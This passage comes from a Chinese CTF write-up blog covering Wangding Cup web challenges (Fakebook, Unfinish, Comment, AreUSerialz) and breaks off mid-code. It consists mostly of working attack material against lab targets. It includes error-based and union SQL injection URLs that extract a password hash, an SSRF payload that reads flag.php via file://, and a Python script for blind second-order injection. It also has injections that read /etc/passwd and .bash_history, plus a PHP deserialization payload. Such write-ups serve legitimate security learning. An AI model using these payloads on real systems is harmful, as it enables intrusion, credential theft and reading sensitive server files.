    <content><![CDATA[<p>/robots.txt</p>
<p>/user.php.bak</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>


<span class="token keyword">class</span> <span class="token class-name">UserInfo</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBlogContents</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span></code></pre>
<p>存在sql注入：</p>
<pre><code>view.php?no=1 and updatexml(1,concat('~',(select/**/database()),'~'),1)%23</code></pre>
<p><img src="/2021/10/24/wang-ding-bei-2018-fakebook/image-20211024022151355.png" alt="image-20211024022151355"></p>
<pre><code>view.php?no=1%20and%20updatexml(1,concat(%27~%27,substr((select%20passwd%20from%20users),110,32),%27~%27),1)%23</code></pre>
<pre><code>view.php?no=2%20union/**/select%201,2,3,%27O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";}%27</code></pre>
<p>flag{c1e552fdf77049fabf65168f22f7aeab}</p>
]]></content>
  </entry>
  <entry>
    <title>网鼎杯：2018-Unfinish</title>
    <url>/2021/08/23/wang-ding-bei-2018-unfinish/</url>
    <content><![CDATA[<p>发现这是一个二次注入的题目，注入点是在register.php传入的username中。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">'http://655262d1-95df-4efd-81d7-d2ac3608e9d3.node4.buuoj.cn:81/'</span>

m <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">"0'+ascii(substr((select * from flag) from {} for 1))+'0"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
    register <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'email'</span><span class="token punctuation">:</span><span class="token string">'abc{}@qq.com'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'username'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'123456'</span><span class="token punctuation">}</span>
    login <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'email'</span><span class="token punctuation">:</span><span class="token string">'abc{}@qq.com'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'123456'</span><span class="token punctuation">}</span>
    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    r1 <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'register.php'</span><span class="token punctuation">,</span>data <span class="token operator">=</span> register<span class="token punctuation">)</span>
    r2 <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'login.php'</span><span class="token punctuation">,</span> data <span class="token operator">=</span> login<span class="token punctuation">)</span>
    r3 <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'index.php'</span><span class="token punctuation">)</span>
    html <span class="token operator">=</span> r3<span class="token punctuation">.</span>text
    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>
    UserName <span class="token operator">=</span> soup<span class="token punctuation">.</span>span<span class="token punctuation">.</span>string<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> int<span class="token punctuation">(</span>UserName<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    m <span class="token operator">+=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>UserName<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>网鼎杯:2018-Comment</title>
    <url>/2021/08/05/wang-ding-bei-2018-comment/</url>
    <content><![CDATA[<p>发帖需要登录扫描到密码zhangwei666</p>
<p><img src="/2021/08/05/wang-ding-bei-2018-comment/1.png" alt="1"></p>
<p>git_extract扫描到</p>
<p><img src="/2021/08/05/wang-ding-bei-2018-comment/2.png" alt="2"></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">"mysql.php"</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">case</span> <span class="token string">'write'</span><span class="token punctuation">:</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into board
            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>
                title <span class="token operator">=</span> <span class="token string">'$title'</span><span class="token punctuation">,</span>
                content <span class="token operator">=</span> <span class="token string">'$content'</span>"<span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">case</span> <span class="token string">'comment'</span><span class="token punctuation">:</span>
    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select category from board where id='$bo_id'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into comment
            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>
                content <span class="token operator">=</span> <span class="token string">'$content'</span><span class="token punctuation">,</span>
                bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./comment.php?id=$bo_id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">default</span><span class="token punctuation">:</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>在write部分使用addslashes()函数进行了过滤</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>comment部分对从数据库中取出的category没有过滤，这就造成了二次注入</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>在发帖处构造category为</p>
<pre><code>', content=user(),/*</code></pre>
<p>在留言处输入的content为</p>
<pre><code>*/#</code></pre>
<p><img src="/2021/08/05/wang-ding-bei-2018-comment/3.png" alt="3"></p>
<pre><code>',content=(select(load_file("/etc/passwd"))),/*</code></pre>
<p><img src="/2021/08/05/wang-ding-bei-2018-comment/4.png" alt="4"></p>
<p>接下来读取文件,注意看到/home/www下以bash身份运行</p>
<pre><code>',content=(select(load_file("/home/www/.bash_history"))),/*</code></pre>
<p><img src="/2021/08/05/wang-ding-bei-2018-comment/5.png" alt="5"></p>
<pre><code>',content=(select(load_file("/tmp/html/.DS_Store"))),/*</code></pre>
<p>未显示完全,用hex编码显示</p>
<pre><code>',content=(select hex(load_file("/tmp/html/.DS_Store"))),/*</code></pre>
<p><img src="/2021/08/05/wang-ding-bei-2018-comment/6.png" alt="6"></p>
<p><img src="/2021/08/05/wang-ding-bei-2018-comment/7.png" alt="7"></p>
<pre><code>',content=(select hex(load_file("/tmp/html/flag_8946e1ff1ee3e40f.php"))),/*</code></pre>
<p><img src="/2021/08/05/wang-ding-bei-2018-comment/8.png" alt="8"></p>
<p>假的flag</p>
<pre><code>',content=(select hex(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php"))),/*</code></pre>
<p><img src="/2021/08/05/wang-ding-bei-2018-comment/9.png" alt="9"></p>
<p><img src="/2021/08/05/wang-ding-bei-2018-comment/10.png" alt="10"></p>
]]></content>
  </entry>
  <entry>
    <title>网鼎杯:2020-AreUSerialz</title>
    <url>/2021/06/18/wang-ding-bei-2020-areuserialz/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">{</span><span class="token string">'str'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<pre><code>O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:8:"flag.php";S:10:"\00*\00content";S:7:"oavinci";}</code></pre>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"oavinci"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>或者使用PHP伪协议读取flag.php：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>
